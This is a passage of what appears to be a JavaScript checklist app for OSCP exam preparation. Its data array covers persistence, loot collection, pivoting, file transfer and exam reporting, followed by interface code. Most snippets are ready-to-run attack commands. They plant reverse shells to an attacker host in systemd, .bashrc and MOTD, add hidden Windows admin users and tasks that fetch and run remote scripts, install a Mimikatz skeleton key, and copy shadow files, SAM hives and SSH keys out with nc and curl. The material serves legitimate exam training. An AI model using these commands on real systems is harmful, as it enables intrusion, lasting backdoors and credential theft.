/var/lib/.systemd-session\nchattr +i /var/lib/.systemd-session  # immutable attribute (needs root)\n\n# ─── Systemd service persistence ───\ncat > /etc/systemd/system/syslogd-helper.service << 'EOF'\n[Unit]\nDescription=System Logging Helper\nAfter=network.target\n[Service]\nType=simple\nRestart=always\nRestartSec=60\nExecStart=/bin/bash -c 'bash -i >& /dev/tcp/<ATTACKER_IP>/<PORT> 0>&1'\n[Install]\nWantedBy=multi-user.target\nEOF\nsystemctl enable syslogd-helper.service\nsystemctl start syslogd-helper.service\n\n# ─── .bashrc / .profile persistence ───\necho 'nohup bash -c \"bash -i >& /dev/tcp/<ATTACKER_IP>/<PORT> 0>&1\" &' >> /root/.bashrc\necho 'nohup bash -c \"bash -i >& /dev/tcp/<ATTACKER_IP>/<PORT> 0>&1\" &' >> /home/<USER>/.bash_profile\n\n# ─── MOTD script ───\necho 'bash -i >& /dev/tcp/<ATTACKER_IP>/<PORT> 0>&1' >> /etc/update-motd.d/00-header\nchmod +x /etc/update-motd.d/00-header\n# Triggers when user logs in via SSH"
      }
    ],
    "brief_description": "Always add SSH keys as primary persistence — it's quiet and survives reboots. Cron-based reverse shell is secondary."
  },
  {
    "id": "item-persist-2",
    "phase": "12. Persistence & Looting",
    "step": "12.2 Windows Persistence",
    "title": "Establish persistence on Windows targets",
    "feasible_when": "Administrator or SYSTEM access has been achieved on a Windows target.",
    "snippets": [
      {
        "lang": "powershell",
        "code": "# ─── Backdoor user ───\nnet user hacker Password123! /add\nnet localgroup administrators hacker /add\nnet localgroup 'Remote Desktop Users' hacker /add\n\n# Enable RDP if not already enabled\nreg add 'HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server' /v fDenyTSConnections /t REG_DWORD /d 0 /f\nnetsh advfirewall firewall add rule name='Allow RDP' protocol=TCP dir=in localport=3389 action=allow\n\n# ─── Scheduled task persistence ───\nschtasks /create /sc MINUTE /mo 5 /tn 'Windows Telemetry' /tr 'powershell -nop -ep bypass -c \"IEX(New-Object Net.WebClient).DownloadString(''http://<ATTACKER_IP>/rev.ps1'')\"' /ru SYSTEM\nschtasks /create /sc ONLOGON /tn 'Microsoft Update' /tr 'C:\\Windows\\Temp\\rev.exe' /ru SYSTEM\nschtasks /run /tn 'Windows Telemetry'\n\n# ─── Registry AutoRun ───\nreg add 'HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run' /v 'WindowsDefenderUpdate' /t REG_SZ /d 'C:\\Windows\\Temp\\rev.exe' /f\nreg add 'HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run' /v 'OneDriveHelper' /t REG_SZ /d 'C:\\Windows\\Temp\\rev.exe' /f\n\n# ─── Service persistence ───\nsc create 'WinUpdateSvc' binpath= 'C:\\Windows\\Temp\\rev.exe' start= auto\nsc start 'WinUpdateSvc'\n\n# ─── DLL hijack persistence (via HKCU\\Software\\Classes) ───\nreg add 'HKCU\\Software\\Classes\\CLSID\\{<GUID>}\\InProcServer32' /ve /t REG_SZ /d 'C:\\Windows\\Temp\\evil.dll' /f\n\n# ─── WMI event subscription persistence ───\n$TimerArgs = @{\n  Name = 'UpdateChecker'\n  IntervalBetweenEvents = 300000  # 5 minutes in ms\n}\n$Filter = Set-WmiInstance -Namespace root\\subscription -Class __IntervalTimerInstruction -Arguments $TimerArgs\n$ConsumerArgs = @{\n  Name = 'UpdateConsumer'\n  CommandLineTemplate = 'C:\\Windows\\Temp\\rev.exe'\n}\n$Consumer = Set-WmiInstance -Namespace root\\subscription -Class CommandLineEventConsumer -Arguments $ConsumerArgs\n$BindingArgs = @{\n  Filter = $Filter\n  Consumer = $Consumer\n}\nSet-WmiInstance -Namespace root\\subscription -Class __FilterToConsumerBinding -Arguments $BindingArgs\n\n# ─── Golden / Silver ticket (AD) ───\n# (see section 11.5)\n\n# ─── Skeleton Key (Mimikatz — in-memory, lost on reboot) ───\n.\\mimikatz.exe \"privilege::debug\" \"misc::skeleton\" \"exit\"\n# Now ANY domain account's password is 'mimikatz' (in addition to real password)\n# Works only until DC is rebooted"
      }
    ],
    "brief_description": "Use scheduled tasks for persistence — they survive reboots and are easy to hide with benign-sounding names. WMI subscriptions are stealthy."
  },
  {
    "id": "item-persist-3",
    "phase": "12. Persistence & Looting",
    "step": "12.3 Loot Collection",
    "title": "Collect and organize all loot before leaving a target",
    "feasible_when": "Root (Linux) or Administrator/SYSTEM (Windows) access has been achieved.",
    "snippets": [
      {
        "lang": "bash",
        "code": "# ─── Linux loot collection ───\nmkdir -p ~/oscp/<TARGET_IP>/loot/{creds,keys,hashes,configs,files}\n\n# Credentials\ncat /etc/shadow > ~/oscp/<TARGET_IP>/loot/hashes/shadow.txt\ncat /etc/passwd > ~/oscp/<TARGET_IP>/loot/hashes/passwd.txt\nfind / -name '*.txt' -path '*/home/*' 2>/dev/null | xargs grep -li 'password\\|pass\\|secret' 2>/dev/null\ngrep -r 'password\\|secret\\|api_key\\|token' /var/www/ /opt/ /home/ /srv/ 2>/dev/null | head -50\n\n# SSH keys\nfind / -name 'id_rsa' -o -name 'id_ecdsa' -o -name 'id_ed25519' 2>/dev/null | while read f; do cp $f ~/oscp/<TARGET_IP>/loot/keys/$(basename $f)_$(echo $f | tr '/' '_'); done\n\n# Flags\nfind / -name 'local.txt' -o -name 'proof.txt' -o -name 'flag.txt' 2>/dev/null | xargs cat\n\n# Config files\nfind /var/www/ /opt/ /srv/ -name '*.conf' -o -name '*.config' -o -name '.env' 2>/dev/null | xargs cp -t ~/oscp/<TARGET_IP>/loot/configs/ 2>/dev/null\n\n# ─── Windows loot collection ───\n# Create loot dir\nNew-Item -ItemType Directory -Path C:\\Windows\\Temp\\loot -Force\n\n# Hash files\nreg save HKLM\\SAM C:\\Windows\\Temp\\loot\\SAM\nreg save HKLM\\SYSTEM C:\\Windows\\Temp\\loot\\SYSTEM\nreg save HKLM\\SECURITY C:\\Windows\\Temp\\loot\\SECURITY\n\n# Credential files\ncopy 'C:\\Windows\\Panther\\Unattend.xml' C:\\Windows\\Temp\\loot\\ 2>nul\ncopy 'C:\\inetpub\\wwwroot\\web.config' C:\\Windows\\Temp\\loot\\ 2>nul\nreg query 'HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon' >> C:\\Windows\\Temp\\loot\\winlogon.txt\n\n# Flags\nGet-ChildItem C:\\Users\\*\\Desktop\\*.txt -ErrorAction SilentlyContinue | Get-Content\n\n# Transfer loot to attacker\n# impacket-smbserver share ~/oscp/<TARGET_IP>/loot -smb2support\ncopy C:\\Windows\\Temp\\loot\\* \\\\<ATTACKER_IP>\\share\\"
      }
    ],
    "brief_description": "Always collect shadow, config files, SSH keys, and SAM/SYSTEM before leaving — you may not get back in."
  },

  // ============================================================
  // PHASE 13 — PIVOTING & TUNNELING
  // ============================================================
  {
    "id": "item-pivot-1",
    "phase": "13. Pivoting & Tunneling",
    "step": "13.1 SSH Tunneling",
    "title": "SSH local, remote, and dynamic port forwarding for pivoting",
    "feasible_when": "Port 22 is accessible on a pivot host and valid SSH credentials are available; internal network is not directly routable.",
    "snippets": [
      {
        "lang": "bash",
        "code": "# ─── Local port forward — access internal service from attacker ───\nssh -L <LOCAL_PORT>:<INTERNAL_IP>:<INTERNAL_PORT> <USER>@<PIVOT_IP>\n# Access: curl http://127.0.0.1:<LOCAL_PORT>    (reaches INTERNAL_IP:INTERNAL_PORT)\n# Examples:\nssh -L 8080:192.168.1.100:80 user@<PIVOT_IP>    # HTTP\nssh -L 4445:192.168.1.100:445 user@<PIVOT_IP>   # SMB\nssh -L 3307:192.168.1.100:3306 user@<PIVOT_IP>  # MySQL\nssh -L 1433:192.168.1.100:1433 user@<PIVOT_IP>  # MSSQL\n\n# ─── Remote port forward — expose attacker service to target's network ───\nssh -R <REMOTE_PORT>:127.0.0.1:<LOCAL_PORT> user@<PIVOT_IP>\n# Allows pivot host to reach attacker's service on <REMOTE_PORT>\n# Example: expose attacker's web server\nssh -R 8080:127.0.0.1:80 user@<PIVOT_IP>\n# On pivot: curl http://127.0.0.1:8080 → reaches attacker:80\n\n# ─── Dynamic SOCKS proxy — route all traffic through pivot ───\nssh -D 1080 user@<PIVOT_IP>\nssh -D 1080 -N user@<PIVOT_IP>   # -N = no command, just tunnel\n\n# Configure proxychains\necho 'socks5 127.0.0.1 1080' >> /etc/proxychains4.conf\n# Or edit /etc/proxychains4.conf:\n# [ProxyList]\n# socks5 127.0.0.1 1080\n\n# Use through proxychains\nproxychains4 -q nmap -sT -Pn <INTERNAL_IP>\nproxychains4 -q nmap -sT -Pn -p 22,80,443,445,3389 <INTERNAL_CIDR>\nproxychains4 -q curl http://<INTERNAL_IP>\nproxychains4 -q crackmapexec smb <INTERNAL_IP> -u <USER> -p '<PASS>'\nproxychains4 -q impacket-psexec <DOMAIN>/<USER>:<PASS>@<INTERNAL_IP>\nproxychains4 -q evil-winrm -i <INTERNAL_IP> -u <USER> -p '<PASS>'\n\n# ─── Combined options ───\nssh -N -f -L 8080:<INTERNAL>:80 -D 1080 user@<PIVOT_IP>\n# -N = no shell, -f = background, -L + -D = local forward + SOCKS\n\n# ─── Keep tunnel alive ───\nssh -o ServerAliveInterval=30 -o ServerAliveCountMax=3 -D 1080 -N user@<PIVOT_IP>\n\n# ─── Multi-hop tunneling (pivot through two hosts) ───\nssh -L 2222:<SECOND_PIVOT>:22 user@<FIRST_PIVOT>\n# Then in new terminal:\nssh -D 1080 -p 2222 user@127.0.0.1   # uses tunnel to reach second pivot"
      }
    ],
    "brief_description": "Dynamic SOCKS (-D 1080) + proxychains lets every tool reach internal networks. Local forward (-L) for specific services."
  },
  {
    "id": "item-pivot-2",
    "phase": "13. Pivoting & Tunneling",
    "step": "13.2 Chisel Tunneling",
    "title": "Chisel HTTP tunnel for pivoting when SSH is unavailable",
    "feasible_when": "SSH is unavailable but HTTP/HTTPS outbound is allowed; file transfer to pivot host is possible.",
    "snippets": [
      {
        "lang": "bash",
        "code": "# ─── Download chisel ───\n# Attacker:\nwget https://github.com/jpillora/chisel/releases/latest/download/chisel_1.9.1_linux_amd64.gz\ngzip -d chisel_1.9.1_linux_amd64.gz && mv chisel_1.9.1_linux_amd64 chisel && chmod +x chisel\n\n# Windows version:\nwget https://github.com/jpillora/chisel/releases/latest/download/chisel_1.9.1_windows_amd64.gz\n\n# ─── Reverse SOCKS tunnel (pivot initiates to attacker) ───\n# Step 1: Attacker starts server\n./chisel server --reverse -p 8000 -v\n# Step 2: Pivot target connects out\n./chisel client <ATTACKER_IP>:8000 R:socks\n# SOCKS5 is now at 127.0.0.1:1080 on attacker\nproxychains4 nmap -sT -Pn <INTERNAL_IP>\n\n# ─── Reverse specific port forward ───\n# Attacker:\n./chisel server --reverse -p 8000\n# Target:\n./chisel client <ATTACKER_IP>:8000 R:8080:<INTERNAL_IP>:80\n# Now: curl http://127.0.0.1:8080 → reaches INTERNAL_IP:80\n\n# ─── Forward SOCKS (attacker connects to target) ───\n# Target:\n./chisel server -p 8000 --socks5\n# Attacker:\n./chisel client <TARGET_IP>:8000 socks\n\n# ─── Windows pivot ───\n# Transfer chisel.exe to target\n# Run:\n.\\chisel.exe client <ATTACKER_IP>:8000 R:socks\n\n# ─── Configure proxychains for chisel ───\ncat >> /etc/proxychains4.conf << 'EOF'\n[ProxyList]\nsocks5 127.0.0.1 1080\nEOF\n\n# ─── Use through proxychains ───\nproxychains4 -q crackmapexec smb <INTERNAL_IP> -u <USER> -p '<PASS>'\nproxychains4 -q impacket-secretsdump <DOMAIN>/<USER>:<PASS>@<INTERNAL_IP>\nproxychains4 -q nmap -sT -Pn -p- <INTERNAL_IP>"
      }
    ],
    "brief_description": "Chisel tunnels over HTTP — works when only web traffic is allowed outbound. R:socks creates reverse SOCKS5 proxy on attacker."
  },
  {
    "id": "item-pivot-3",
    "phase": "13. Pivoting & Tunneling",
    "step": "13.3 Ligolo-ng Tunneling",
    "title": "Ligolo-ng transparent tunneling via virtual TUN interface",
    "feasible_when": "A shell on a pivot host is available with outbound TCP access; file transfer is possible.",
    "snippets": [
      {
        "lang": "bash",
        "code": "# ─── Setup ───\n# Attacker — download proxy (server component)\nwget https://github.com/nicocha30/ligolo-ng/releases/latest/download/proxy_linux_amd64\nchmod +x proxy_linux_amd64\n\n# Target — download agent\nwget https://github.com/nicocha30/ligolo-ng/releases/latest/download/agent_linux_amd64\n# Windows:\nwget https://github.com/nicocha30/ligolo-ng/releases/latest/download/agent_windows_amd64.exe\n\n# ─── Attacker — create TUN interface ───\nsudo ip tuntap add user root mode tun ligolo\nsudo ip link set ligolo up\n\n# ─── Attacker — start proxy ───\nsudo ./proxy_linux_amd64 -selfcert -laddr 0.0.0.0:11601\n\n# ─── Target — start agent ───\n./agent_linux_amd64 -connect <ATTACKER_IP>:11601 -ignore-cert\n# Windows:\n.\\agent_windows_amd64.exe -connect <ATTACKER_IP>:11601 -ignore-cert\n\n# ─── Ligolo-ng proxy console ───\nligolo-ng >> session               # select the session\nligolo-ng >> 1                     # enter session number\nligolo-ng >> ifconfig              # see target interfaces\nligolo-ng >> start                 # start routing\n\n# ─── Attacker — add route to internal network ───\nsudo ip route add <INTERNAL_NETWORK_CIDR> dev ligolo\n# Example:\nsudo ip route add 192.168.2.0/24 dev ligolo\nsudo ip route add 10.10.10.0/24 dev ligolo\n\n# ─── Now use any tool directly — no proxychains! ───\nnmap -sT -Pn -p 22,80,445,3389 192.168.2.0/24\nnmap -sU -p 53,161 192.168.2.1\ncrackmapexec smb 192.168.2.0/24 -u <USER> -p '<PASS>'\ncurl http://192.168.2.100\nimpacket-psexec <DOMAIN>/<USER>:<PASS>@192.168.2.100\n\n# ─── Add listener for reverse shells through ligolo ───\n# On ligolo proxy console:\nligolo-ng >> listener_add --addr 0.0.0.0:<PORT> --to 127.0.0.1:<PORT>\n# Now trigger shell on target — it connects to <ATTACKER_IP>:<PORT> via ligolo\n\n# ─── Multi-hop (second pivot through first pivot) ───\n# On first pivot agent console — start second agent toward second pivot\n# Add nested route:\nsudo ip route add <SECOND_INTERNAL_CIDR> dev ligolo"
      }
    ],
    "brief_description": "Ligolo-ng creates a real TUN interface — no proxychains needed, supports UDP/ICMP, much faster than proxychains. Use for serious pivoting."
  },
  {
    "id": "item-pivot-4",
    "phase": "13. Pivoting & Tunneling",
    "step": "13.4 Windows-Native Pivoting",
    "title": "Windows pivoting using Plink, Netsh portproxy, and built-in tools",
    "feasible_when": "A Windows shell is available as a pivot host; no additional tools may be available.",
    "snippets": [
      {
        "lang": "powershell",
        "code": "# ─── Netsh portproxy (native, always available) ───\n# Forward local port to internal service\nnetsh interface portproxy add v4tov4 listenport=<LOCAL_PORT> listenaddress=0.0.0.0 connectport=<INTERNAL_PORT> connectaddress=<INTERNAL_IP>\n# Show all rules\nnetsh interface portproxy show all\n# Delete rule\nnetsh interface portproxy delete v4tov4 listenport=<LOCAL_PORT> listenaddress=0.0.0.0\n# Reset all\nnetsh interface portproxy reset\n\n# Example: expose internal RDP (3389) on pivot's 33389\nnetsh interface portproxy add v4tov4 listenport=33389 listenaddress=0.0.0.0 connectport=3389 connectaddress=192.168.1.100\n# From attacker: xfreerdp /v:<PIVOT_IP>:33389 /u:<USER> /p:<PASS>\n\n# Allow through firewall\nnetsh advfirewall firewall add rule name='PortProxy' dir=in action=allow protocol=TCP localport=<LOCAL_PORT>\n\n# ─── Plink (Putty command-line SSH) ───\n# Transfer plink.exe to target\n# Local forward\necho y | plink.exe -ssh -l <SSH_USER> -pw '<SSH_PASS>' -L <LOCAL_PORT>:<INTERNAL_IP>:<INTERNAL_PORT> <ATTACKER_IP>\n# Remote forward (tunnel back to attacker)\necho y | plink.exe -ssh -l <SSH_USER> -pw '<SSH_PASS>' -R <REMOTE_PORT>:127.0.0.1:<LOCAL_PORT> <ATTACKER_IP>\n# Dynamic SOCKS\necho y | plink.exe -ssh -l <SSH_USER> -pw '<SSH_PASS>' -D 1080 <ATTACKER_IP>\n\n# ─── Windows built-in SSH client (Win 10/Server 2019+) ───\nGet-WindowsCapability -Online -Name OpenSSH*\nssh -L 8080:<INTERNAL_IP>:80 <USER>@<ATTACKER_IP>   # local forward\nssh -D 1080 <USER>@<ATTACKER_IP>                    # SOCKS proxy\n\n# ─── socat (if available) ───\nsocat TCP-LISTEN:<LOCAL_PORT>,fork TCP:<INTERNAL_IP>:<INTERNAL_PORT>\n\n# ─── Socat download alternatives ───\n# socat.exe from: https://github.com/tech128/socat-1.7.3.0-windows\n.\\socat.exe TCP-LISTEN:<LOCAL_PORT>,fork TCP:<INTERNAL_IP>:<INTERNAL_PORT>\n\n# ─── PowerShell port forward (simple, no binary) ───\n$listener = [System.Net.Sockets.TcpListener]<LOCAL_PORT>\n$listener.Start()\nwhile ($true) {\n  $client = $listener.AcceptTcpClient()\n  $target = New-Object System.Net.Sockets.TcpClient('<INTERNAL_IP>', <INTERNAL_PORT>)\n  # ... stream relay logic\n}"
      }
    ],
    "brief_description": "Netsh portproxy is available on all Windows versions with no extra tools — useful for quick pivots."
  },

  // ============================================================
  // PHASE 14 — FILE TRANSFERS
  // ============================================================
  {
    "id": "item-110",
    "phase": "14. File Transfers",
    "step": "14.1 Attacker → Target (Upload)",
    "title": "Upload to Linux",
    "feasible_when": "A shell on a Linux target has been obtained and outbound HTTP/nc connections from the target to the attacker are possible.",
    "snippets": [
      {
        "lang": "bash",
        "code": "# Python HTTP server\npython3 -m http.server 80\nwget http://ATTACKER_IP/file -O /tmp/file\ncurl http://ATTACKER_IP/file -o /tmp/file\n\n# SCP\nscp file.txt user@$TARGET:/tmp/file.txt\n\n# Netcat\nnc -nlvp 4444 < file          # sender\nnc ATTACKER_IP 4444 > file    # receiver\n\n# Base64 encode/decode (no network tools)\nbase64 -w0 file > file.b64    # encode on attacker\ncat file.b64                  # copy and paste\necho 'BASE64' | base64 -d > file  # decode on target\n\n# /dev/tcp transfer\ncat file > /dev/tcp/ATTACKER_IP/4444  # target sends file\nnc -nlvp 4444 > file                  # attacker receives"
      }
    ],
    "brief_description": "Always set up your HTTP server first — wget and curl are almost always available on Linux targets."
  },
  {
    "id": "item-111",
    "phase": "14. File Transfers",
    "step": "14.1 Attacker → Target (Upload)",
    "title": "Upload to Windows",
    "feasible_when": "A shell on a Windows target has been obtained and the target can reach the attacker machine over HTTP or SMB.",
    "snippets": [
      {
        "lang": "powershell",
        "code": "# PowerShell download\nInvoke-WebRequest -Uri http://ATTACKER_IP/file -OutFile C:\\tmp\\file\n(New-Object Net.WebClient).DownloadFile('http://ATTACKER_IP/file', 'C:\\tmp\\file')\nIEX(New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/script.ps1')  # execute in memory\n\n# certutil\ncertutil -urlcache -f http://ATTACKER_IP/file C:\\tmp\\file\ncertutil -urlcache -f http://ATTACKER_IP/file.exe C:\\tmp\\file.exe\n\n# bitsadmin\nbitsadmin /transfer job /download /priority high http://ATTACKER_IP/file C:\\tmp\\file\n\n# SMB (impacket-smbserver)\nimpacket-smbserver share $(pwd) -smb2support\ncopy \\\\ATTACKER_IP\\share\\file C:\\tmp\\file\n\n# Base64 (copy/paste when all else fails)\n[IO.File]::WriteAllBytes('C:\\tmp\\file', [Convert]::FromBase64String('BASE64STRING'))"
      }
    ],
    "brief_description": "certutil and PowerShell WebClient work on all Windows versions — SMB transfer is fastest for large files."
  },
  {
    "id": "item-112",
    "phase": "14. File Transfers",
    "step": "14.2 Target → Attacker (Exfiltrate)",
    "title": "Exfiltrate files",
    "feasible_when": "A shell has been obtained and sensitive files have been identified for exfiltration.",
    "snippets": [
      {
        "lang": "bash",
        "code": "# Linux — nc exfil\nnc -nlvp 4444 > loot.txt          # attacker\nnc ATTACKER_IP 4444 < /etc/shadow  # target\n\n# curl upload\n# Attacker setup (upload.php or simple server):\npython3 -c \"\nimport sys\nfrom http.server import HTTPServer, BaseHTTPRequestHandler\nclass H(BaseHTTPRequestHandler):\n    def do_PUT(self):\n        length = int(self.headers['Content-Length'])\n        data = self.rfile.read(length)\n        open(self.path[1:],'wb').write(data)\n        self.send_response(200); self.end_headers()\nHTTPServer(('0.0.0.0', 8080), H).serve_forever()\"\n# Target:\ncurl -T /etc/shadow http://ATTACKER_IP:8080/shadow\n\n# SCP\nscp user@$TARGET:/etc/shadow ./shadow\n\n# SMB (Windows)\ncopy C:\\sensitive.txt \\\\ATTACKER_IP\\share\\"
      }
    ],
    "brief_description": "Set up your exfil server before grabbing files — nc pipe or curl -T are the fastest options."
  },

  // ============================================================
  // PHASE 15 — PROOF COLLECTION & REPORTING
  // ============================================================
  {
    "id": "item-113",
    "phase": "15. Proof Collection & Reporting",
    "step": "15.1 Proof Flags",
    "title": "Capture Linux proof",
    "feasible_when": "Root-level access has been achieved on a Linux target.",
    "snippets": [
      {
        "lang": "bash",
        "code": "# Root proof\ncat /root/proof.txt && echo '---' && whoami && hostname && ip a\n\n# User proof\ncat /home/*/local.txt && echo '---' && whoami && hostname && ip a\n\n# Screenshot command showing flag + id + hostname + ip\nid; hostname; ip a; cat /root/proof.txt"
      }
    ],
    "brief_description": "Always capture: flag content + whoami/id + hostname + ip — all in the same terminal screenshot."
  },
  {
    "id": "item-114",
    "phase": "15. Proof Collection & Reporting",
    "step": "15.1 Proof Flags",
    "title": "Capture Windows proof",
    "feasible_when": "Administrator or SYSTEM access has been achieved on a Windows target.",
    "snippets": [
      {
        "lang": "powershell",
        "code": "# Admin proof\ntype C:\\Users\\Administrator\\Desktop\\proof.txt\nwhoami; hostname; ipconfig\n\n# User proof\ntype C:\\Users\\*\\Desktop\\local.txt\nwhoami; hostname; ipconfig\n\n# Combined screenshot command\nwhoami; hostname; ipconfig /all; type C:\\Users\\Administrator\\Desktop\\proof.txt"
      }
    ],
    "brief_description": "Capture all proof in a single scrolling terminal window — include all required elements in one screenshot."
  },
  {
    "id": "item-115",
    "phase": "15. Proof Collection & Reporting",
    "step": "15.2 Evidence Checklist",
    "title": "Required screenshots per machine",
    "feasible_when": "Always — apply to every machine throughout the exam.",
    "snippets": [
      {
        "lang": "",
        "code": "For each machine capture:\n1. Initial foothold (first shell, showing command that triggered it)\n2. local.txt flag with: whoami + hostname + ip\n3. privilege escalation step (the pivoting command)\n4. proof.txt flag with: whoami/id (root/SYSTEM) + hostname + ip\n5. Any critical intermediate step\n\nNaming convention:\n  <IP>_initial_foothold.png\n  <IP>_local_flag.png\n  <IP>_privesc.png\n  <IP>_proof_flag.png"
      }
    ],
    "brief_description": "Screenshot every key step — if it's not documented with a screenshot, it didn't happen."
  },
  {
    "id": "item-116",
    "phase": "15. Proof Collection & Reporting",
    "step": "15.3 Exam Report",
    "title": "Report structure per machine",
    "feasible_when": "Always — write the report entry for each machine as you complete it, not at the end.",
    "snippets": [
      {
        "lang": "",
        "code": "For each target machine:\n\n1. High-Level Summary\n   - IP / Hostname / OS\n   - Entry vector (service, CVE)\n   - Privilege escalation method\n\n2. Service Enumeration\n   - Port scan output (nmap)\n   - Interesting services found\n\n3. Initial Exploitation\n   - Vulnerability identified (CVE if applicable)\n   - Step-by-step reproducible commands\n   - Screenshot: first shell\n   - local.txt flag screenshot\n\n4. Privilege Escalation\n   - Method used + justification\n   - Step-by-step reproducible commands\n   - Screenshot: root/SYSTEM shell\n   - proof.txt flag screenshot\n\n5. Post-Exploitation\n   - Credentials found\n   - Lateral movement if applicable\n   - Commands used (copy-paste ready)\n\n# Report templates:\n# https://github.com/noraj/OSCP-Exam-Report-Template-Markdown\n# https://github.com/whoisflynn/OSCP-Exam-Report-Template"
      }
    ],
    "brief_description": "Each machine needs a fully reproducible write-up — write it during the exam, not after."
  }

];

const STORAGE_KEY = 'oscp-checklist-ui-v2';
const SNIPPET_LANG_ALIASES = {
  sh: 'bash',
  shell: 'bash',
  zsh: 'bash',
  ps: 'powershell',
  ps1: 'powershell',
  pwsh: 'powershell',
  bat: 'dos',
  batch: 'dos',
  cmd: 'dos',
  csharp: 'csharp',
  'c#': 'csharp',
  yml: 'yaml'
};
const GROUP_METADATA = {};
const COPY_FEEDBACK_DURATION_MS = 950;

const dom = {
  phaseNav: document.getElementById('phaseNav'),
  phaseContainer: document.getElementById('phaseContainer'),
  progressText: document.getElementById('progressText'),
  progressFill: document.getElementById('progressFill'),
  searchInput: document.getElementById('searchInput'),
  resetBtn: document.getElementById('resetBtn'),
  expandBtn: document.getElementById('expandBtn'),
  collapseBtn: document.getElementById('collapseBtn'),
  phaseCountChip: document.getElementById('phaseCountChip'),
  taskCountChip: document.getElementById('taskCountChip'),
  taskTemplate: document.getElementById('taskTemplate'),
  snippetTemplate: document.getElementById('snippetTemplate'),
  resetModal: document.getElementById('resetModal'),
  resetModalCancel: document.getElementById('resetModalCancel'),
  resetModalConfirm: document.getElementById('resetModalConfirm')
};

let state = loadState();
const phaseMap = buildPhaseMap(CHECKLIST_DATA);
const phaseMetaMap = new Map();
const phaseRefs = [];
const itemRefs = [];
let lastAutoCopiedText = '';
let lastAutoCopiedAt = 0;
let resetModalReturnFocusEl = null;
let activePhaseFilter = null;

enrichChecklistData(CHECKLIST_DATA);
warnMissingFeasibleWhen(CHECKLIST_DATA);
enrichPhaseMetadata();

initTheme();
renderNav();
renderPhases();
updateProgress();
applyFilter('');

bindEvents();

function loadState() {
  try {
    const raw = localStorage.getItem(STORAGE_KEY);
    if (!raw) {
      return {
        checked: {},
        collapsed: {}
      };
    }
    const parsed = JSON.parse(raw);
    return {
      checked: parsed.checked || {},
      collapsed: parsed.collapsed || {}
    };
  } catch {
    return {
      checked: {},
      collapsed: {}
    };
  }
}

function saveState() {
  localStorage.setItem(STORAGE_KEY, JSON.stringify(state));
}

function initTheme() {
  document.documentElement.setAttribute('data-theme', 'dark');
}

function buildPhaseMap(items) {
  const map = new Map();
  for (const item of items) {
    if (!map.has(item.phase)) {
      map.set(item.phase, []);
    }
    map.get(item.phase).push(item);
  }
  return map;
}

function hashHue(input) {
  let hash = 0;
  const text = String(input || '');
  for (let i = 0; i < text.length; i += 1) {
    hash = (hash * 31 + text.charCodeAt(i)) % 360;
  }
  return hash;
}

function phaseAccentFor(phaseName) {
  const hue = hashHue(`phase:${phaseName}`);
  return `hsl(${hue} 86% 62%)`;
}

function stepAccentFor(stepName) {
  const hue = (hashHue(`step:${stepName}`) + 18) % 360;
  return `hsl(${hue} 84% 64%)`;
}

function renderNav() {
  dom.phaseNav.innerHTML = '';

  const entries = [...phaseMap.entries()];
  entries.forEach(([phaseName, tasks], listIndex) => {
    const button = document.createElement('button');
    button.type = 'button';
    button.className = 'phase-link';
    button.dataset.phase = phaseName;

    const done = tasks.filter((task) => !!state.checked[task.id]).length;
    const phaseNumberRaw = extractPhaseIndex(phaseName) || String(listIndex + 1);
    const phaseNumber = String(phaseNumberRaw).padStart(2, '0');
    const progress = tasks.length ? Math.round((done / tasks.length) * 100) : 0;
    button.innerHTML = `<span class="phase-link-row"><span class="phase-link-index">${phaseNumber}</span><span class="phase-link-title">${escapeHtml(shortPhase(phaseName))}</span><span class="phase-link-count">${done}/${tasks.length}</span></span><span class="phase-link-meter" aria-hidden="true"><span style="width:${progress}%"></span></span>`;
    button.classList.toggle('is-active', activePhaseFilter === phaseName);

    button.addEventListener('click', () => {
      const isAlreadyActive = activePhaseFilter === phaseName;
      setActivePhaseFilter(isAlreadyActive ? null : phaseName);

      if (isAlreadyActive) {
        return;
      }

      const target = document.getElementById(phaseId(phaseName));
      if (target) {
        expandGroupSection(target, phaseName);
        target.scrollIntoView({ behavior: 'smooth', block: 'start' });
      }
    });

    dom.phaseNav.appendChild(button);
  });
}

function clearActiveGroupSelection() {
  setActivePhaseFilter(null);
}

function setActivePhaseFilter(phaseName) {
  activePhaseFilter = phaseName ? String(phaseName) : null;
  applyActivePhaseFilter();
  syncActiveNavState();
}

function applyActivePhaseFilter() {
  const hasFilter = !!activePhaseFilter;
  phaseRefs.forEach((phaseRef) => {
    const shouldHide = hasFilter && phaseRef.phaseName !== activePhaseFilter;
    phaseRef.section.classList.toggle('is-nav-hidden', shouldHide);
  });
}

function syncActiveNavState() {
  dom.phaseNav.querySelectorAll('.phase-link').forEach((button) => {
    button.classList.toggle('is-active', button.dataset.phase === activePhaseFilter);
  });
}

function renderPhases() {
  dom.phaseContainer.innerHTML = '';
  phaseRefs.length = 0;
  itemRefs.length = 0;

  const entries = [...phaseMap.entries()];
  entries.forEach(([phaseName, tasks], index) => {
    const section = document.createElement('section');
    section.className = 'phase-card';
    section.id = phaseId(phaseName);
    section.dataset.phase = phaseName;
    section.style.setProperty('--phase-accent', phaseAccentFor(phaseName));

    const header = document.createElement('button');
    header.type = 'button';
    header.className = 'phase-head';

    const info = document.createElement('div');
    const title = document.createElement('h3');
    title.className = 'phase-title';
    title.textContent = shortPhase(phaseName);
    const counts = document.createElement('p');
    counts.className = 'phase-counts';
    const phaseMetadata = phaseMetaMap.get(phaseName) || createPhaseMetadata(phaseName, tasks);
    info.append(title, counts);

    const idx = document.createElement('span');
    idx.className = 'phase-index';
    idx.textContent = String(extractPhaseIndex(phaseName) || index + 1).padStart(2, '0');

    const toggleLabel = document.createElement('span');
    toggleLabel.className = 'phase-toggle';

    const phaseDone = document.createElement('label');
    phaseDone.className = 'phase-done';
    const phaseDoneCheck = document.createElement('input');
    phaseDoneCheck.type = 'checkbox';
    phaseDoneCheck.className = 'phase-done-check';
    phaseDoneCheck.setAttribute('aria-label', `Mark group ${shortPhase(phaseName)} complete`);
    phaseDone.append(phaseDoneCheck);

    header.append(idx, phaseDone, info, toggleLabel);

    const body = document.createElement('div');
    body.className = 'phase-body';
    const phaseMetaHtml = renderMetadataInline(phaseMetadata, 'phase');
    if (phaseMetaHtml) {
      const phaseMeta = document.createElement('div');
      phaseMeta.className = 'phase-meta';
